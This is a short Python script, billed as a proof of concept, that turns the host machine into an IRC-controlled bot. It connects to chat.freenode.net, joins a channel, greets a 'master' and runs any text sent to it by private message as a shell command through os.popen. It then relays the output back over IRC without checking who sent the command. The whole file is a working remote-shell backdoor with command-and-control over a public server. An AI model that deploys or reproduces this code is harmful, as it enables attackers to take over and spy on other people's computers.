#!/usr/bin/env python3

# This is just a PoC, and it comes with no warranty or anything.
# Use it at your own risk. it MUST NOT be used in a production environment or anything other than testing.
# PLEASE respect other people's privacy. Only tested on Linux BTW

import os
import socket
import time

HOST = "chat.freenode.net"  # You can change this to whatever you want
PORT = 6667

NICK = "Your Nick Name"
IDENT = "Your Identity"
REALNAME = "Your REAL Name"
MASTER = "The Master of this particular Slave"

CHANNEL = "The Channel To join"

readbuffer = ""

s = socket.socket()
s.connect((HOST, PORT))
# sets the nickname inside IRC channel
s.send(bytes("NICK %s\r\n" % NICK, "UTF-8"))
# Connects to the server using the provided inforamtion above. The 'bla' is irrelevent
s.send(bytes("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME), "UTF-8"))
# Joins the Channel
s.send(bytes("JOIN #%s \r\n" % (CHANNEL), "UTF-8"))
# starts a conversation with the 'master' when joining
s.send(bytes("PRIVMSG %s :Hello Master :) Tell me commands to do \r\n" % MASTER, "UTF-8"))

# TODO: Error handling and freeze detection
while True:
    readbuffer = readbuffer + s.recv(1024).decode("UTF-8")
    temp = str.split(readbuffer, "\n")
    readbuffer = temp.pop()

    for line in temp:
        line = str.rstrip(line)
        line = str.split(line)

        if line[0] == "PING":
            s.send(bytes("PONG %s\r\n" % line[1], "UTF-8"))
        if line[1] == "PRIVMSG":
            sender = ""
            for char in line[0]:
                if char == "!":
                    break
                if char != ":":
                    sender += char
            size = len(line)
            i = 3
            message = ""
            while i < size:
                message += line[i] + " "
                i = i + 1
            message.lstrip(":")
            s.send(bytes("PRIVMSG %s :Executing-> %s \r\n" % (sender, message[1:]), "UTF-8"))
            # Removing the first Char and sent it to shell
            # response = os.system(message[1:])
            p = os.popen(message[1:] + " 2>&1", "r")
            # Puts out the first 20 lines. There's a good reason for this.
            n = 0
            while n < 20:
                line = p.readline()
                if not line:
                    break
                s.send(bytes("PRIVMSG %s :Response -> %s \r\n" % (sender, str(line)), "UTF-8"))
                time.sleep(1)
                n += 1
        for index, i in enumerate(line):
            print(line[index])
